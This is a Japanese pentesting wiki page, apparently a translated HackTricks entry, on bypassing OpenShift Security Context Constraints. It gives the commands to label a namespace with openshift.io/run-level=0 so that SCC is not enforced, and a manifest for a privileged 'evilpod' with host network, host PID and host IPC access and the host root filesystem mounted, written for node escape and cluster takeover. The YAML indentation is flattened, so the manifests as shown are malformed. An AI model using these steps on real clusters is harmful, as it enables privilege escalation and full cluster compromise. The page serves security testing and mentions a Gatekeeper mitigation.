# Openshift - SCC バイパス

**このページの元の著者は** [**Guillaume**](https://www.linkedin.com/in/guillaume-chapela-ab4b9a196)

## 特権付きの名前空間

デフォルトでは、SCC は以下のプロジェクトには適用されません：

- **default**
- **kube-system**
- **kube-public**
- **openshift-node**
- **openshift-infra**
- **openshift**

これらの名前空間のいずれかにポッドをデプロイすると、SCC は強制されず、特権付きのポッドのデプロイやホストファイルシステムのマウントが許可されます。

## 名前空間ラベル

RedHat のドキュメントによると、ポッドで SCC アプリケーションを無効にする方法があります。次のいずれかの権限が必要です：

- 名前空間の作成とその名前空間でのポッドの作成
- 名前空間の編集とその名前空間でのポッドの作成
```bash
$ oc auth can-i create namespaces
yes

$ oc auth can-i patch namespaces
yes
```
特定のラベル`openshift.io/run-level`を使用すると、アプリケーションのためにSCCを回避することができます。RedHatのドキュメントによると、このラベルを使用すると、その名前空間内のすべてのポッドに対してSCCが強制されず、実質的に制限が解除されます。

<figure><img src="../../../.gitbook/assets/Openshift-RunLevel4.png" alt=""><figcaption></figcaption></figure>

## ラベルの追加

名前空間にラベルを追加するには：
```bash
$ oc label ns MYNAMESPACE openshift.io/run-level=0
```
以下の手順で、ラベルを持つ名前空間をYAMLファイルを使用して作成します:

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: my-namespace
  labels:
    my-label: my-value
```
```yaml
apiVersion: v1
kind: Namespace
metadata:
name: evil
labels:
openshift.io/run-level: 0
```
現在、名前空間で作成されたすべての新しいポッドにはSCCがないはずです。

<pre class="language-bash"><code class="lang-bash"><strong>$ oc get pod -o yaml | grep 'openshift.io/scc'
</strong><strong>$
</strong></code></pre>

SCCがない場合、ポッド定義に制限がありません。これは、悪意のあるポッドが簡単に作成されてホストシステムにエスケープする可能性があることを意味します。
```yaml
apiVersion: v1
kind: Pod
metadata:
name: evilpod
labels:
kubernetes.io/hostname: evilpod
spec:
hostNetwork: true #Bind pod network to the host network
hostPID: true #See host processes
hostIPC: true #Access host inter processes
containers:
- name: evil
image: MYIMAGE
imagePullPolicy: IfNotPresent
securityContext:
privileged: true
allowPrivilegeEscalation: true
resources:
limits:
memory: 200Mi
requests:
cpu: 30m
memory: 100Mi
volumeMounts:
- name: hostrootfs
mountPath: /mnt
volumes:
- name: hostrootfs
hostPath:
path:
```
### OpenShift SCC バイパス

現在、特権を昇格させてホストシステムにアクセスし、その後クラスタ全体を乗っ取り、'cluster-admin' 権限を取得することが容易になりました。次のページの **Node-Post Exploitation** 部分を参照してください：

{% content-ref url="../../kubernetes-security/attacking-kubernetes-from-inside-a-pod.md" %}
[attacking-kubernetes-from-inside-a-pod.md](../../kubernetes-security/attacking-kubernetes-from-inside-a-pod.md)
{% endcontent-ref %}

### カスタムラベル

さらに、ターゲットのセットアップに基づいて、以前の攻撃シナリオと同様に一部のカスタムラベル / 注釈が使用される場合があります。それが意図されていなくても、ラベルは特定のリソースに権限を付与したり、制限したり、付与しなかったりするために使用される可能性があります。

リソースを読むことができる場合は、カスタムラベルを探してみてください。以下は興味深いリソースのリストです：

* Pod
* Deployment
* Namespace
* Service
* Route
```bash
$ oc get pod -o yaml | grep labels -A 5
$ oc get namespace -o yaml | grep labels -A 5
```
## すべての特権名前空間をリストします
```bash
$ oc get project -o yaml | grep 'run-level' -b5
```
## 高度なエクスプロイト

OpenShiftでは、以前に示したように、`openshift.io/run-level`ラベルが付いた名前空間にポッドをデプロイする権限を持っていると、クラスターの簡単な乗っ取りにつながる可能性があります。クラスター設定の観点から、この機能はOpenShiftの設計上不可欠なため、**無効にすることはできません**。

ただし、**Open Policy Agent GateKeeper**のような緩和措置を取ることで、ユーザーがこのラベルを設定するのを防ぐことができます。

GateKeeperのルールをバイパスしてこのラベルを設定し、クラスターの乗っ取りを実行するには、**攻撃者は代替手法を特定する必要があります。**

## 参考

* [https://docs.openshift.com/container-platform/4.8/authentication/managing-security-context-constraints.html](https://docs.openshift.com/container-platform/4.8/authentication/managing-security-context-constraints.html)
* [https://docs.openshift.com/container-platform/3.11/admin\_guide/manage\_scc.html](https://docs.openshift.com/container-platform/3.11/admin\_guide/manage\_scc.html)
* [https://github.com/open-policy-agent/gatekeeper](https://github.com/open-policy-agent/gatekeeper)
